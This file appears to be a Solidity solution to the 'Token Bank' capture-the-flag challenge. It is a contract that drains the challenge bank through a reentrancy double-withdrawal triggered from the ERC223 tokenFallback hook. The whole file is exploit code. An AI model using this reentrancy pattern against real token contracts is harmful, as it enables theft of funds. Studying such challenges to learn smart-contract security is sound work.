pragma solidity ^0.4.21;

import "./TokenBankChallenge.sol";

contract TokenBankSolver {
    TokenBankChallenge public challenge;
    SimpleERC223Token public token;

    uint256 halfSupply = 500000 * 10**18;
    bool shouldReenter = false;

    function TokenBankSolver(address _challenge) public {
        challenge = TokenBankChallenge(_challenge);
        token = SimpleERC223Token(challenge.token());
    }

    function solve() public {
        // pull the player's tokens into this contract
        token.transferFrom(msg.sender, address(this), halfSupply);
        // deposit this contract's tokens into the TokenBank
        token.transfer(address(challenge), halfSupply);
        // perform a double-withdrawal from the TokenBank
        shouldReenter = true;
        challenge.withdraw(halfSupply);
        require(challenge.isComplete());
        selfdestruct(msg.sender);
    }

    function tokenFallback(address, uint256, bytes) external {
        if (shouldReenter) {
            shouldReenter = false;
            challenge.withdraw(halfSupply);
        }
    }

}

